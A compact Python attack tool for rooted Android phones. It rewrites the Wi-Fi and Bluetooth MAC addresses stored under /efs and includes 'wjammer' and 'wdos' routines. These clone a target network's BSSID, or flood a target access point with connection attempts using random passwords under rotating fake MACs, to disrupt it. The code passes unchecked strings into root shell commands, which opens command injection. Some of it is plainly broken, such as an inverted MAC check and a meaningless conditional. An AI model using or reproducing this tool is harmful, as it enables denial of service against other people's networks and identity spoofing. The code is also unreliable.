#DeEFS 2.0
from random import choice as rch
from random import randint as rl
from os import system as sy
from time import sleep as sl
import subprocess,re
def unicg(la):
  hc = range(0x10000,0x110000);return ''.join(chr(rch(hc)) for _ in range(la))
def wcon(bssid,pasw,typed):sy("su -c cmd wifi connect-network "+bssid+" "+typed+" "+(pasw if typed != "open" else ""))
def bmac(val):
  if val == 0:mc = open("/efs/wifi/.mac.cob");cob=mc.read();return cob
  elif val == 1:mc = open("/efs/bluetooth/bt_addr");cob=mc.read();return cob
def dumpwlan():
  output = subprocess.check_output(["dumpsys", "wifi", "scan"]);ma = re.findall(r"BSSID: ([\w:]+)", output.decode("utf-8"));ma=list(set(ma));ma.remove("null");ma.remove("00:00:00:00:00:00");return ma
def buffmc(mac):
  if any(cha in ["1","2","3","4","5","6","7","8","9","0","a","b","c","d","e","f",":"] for cha in mac) or len(mac) != 17:return True
  else:return False
def randma():
  def randc():
    v=[]
    for i in range(2):v.append(str(rch(["1","2","3","4","5","6","7","8","9","0","a","b","c","d","e"])))
    else:return "".join(v)
  v=[]
  for i in range(6):v.append(randc())
  else:return ":".join(v)
def dwlan(mac,rf=False):
  if mac == "rand":
    ma=randma();
    if rf == False:sy("su -c svc wifi disable")
    if rf == True:sy("su -c svc wifi disable");sy("service call wifi 47")
    sy("su -c echo "+ma+" > /efs/wifi/.mac.cob && echo "+ma+" > /efs/wifi/.mac.info")
    if rf == False:sy("su -c svc wifi enable")
    if rf == True:sy("service call wifi 49");sy("su -c svc wifi enable")
    return ma
  else:
    buffmc(mac) == False if None else sy("su -c svc wifi disable");sy("su -c echo "+mac+" > /efs/wifi/.mac.cob && echo "+mac+" > /efs/wifi/.mac.info");sy("su -c svc wifi enable");return(0)
def dbt(mac):
  if mac == "rand":
    mab=randma();sy("su -c svc bluetooth disable");sy("su -c echo "+mab+" > /efs/bluetooth/bt_addr");sy("su -c svc bluetooth enable");return mab
  else:
    buffmc(mac) == False if None else sy("su -c svc bluetooth disable");sy("su -c echo "+mac+" > /efs/bluetooth/bt_addr");sy("su -c svc bluetooth enable");return(0)
def adwlan(reg,out=False):
  back=bmac(0)
  for i in range(reg):mac1=dwlan("rand");sy("su -c dumpsys wifi scan "+(("> /dev/null") if out == False else ""));print("\u001b[32m["+str(i)+","+mac1+"] wlan packet send")
  dwlan(str(back))
def adbt(reg,out=False):
  back=bmac(1)
  for i in range(reg):mac1=dbt("rand");sy("su -c dumpsys bluetooth_manager >"+(("> /dev/null") if out == False else ""));print("\u001b[32m["+str(i+1)+","+mac1+"] bt packet send")
  dbt(str(back))
def wjammer(reg,s,tar,typed="open",pasw=""):
  back=bmac(0)
  for i in range(reg):
    if tar == "rand":macs=dumpwlan();macx=rch(macs)
    else: macx=tar
    sl(s);dwlan(str(macx),rf=True);wcon(macx,pasw,typed);print("\u001b[32m["+str(i+1)+","+macx+"] wlan jammer packet send")
  dwlan(str(back))
def wdos(reg,s,tar,ran,typed="wpa2"):
  back=bmac(0)
  if ran < 8 or ran > 63:exit(0)
  for i in range(reg):ja=dwlan("rand");wcon(tar,unicg(rl(8,ran)),typed);print("\u001b[32m["+str(i+1)+","+tar+"] wlan jammer packet send > "+ja);sl(s)
  dwlan(str(back))
def cusefs(dict,value):sy("su -c echo "+value+" > /efs/"+dict)
#jump_out
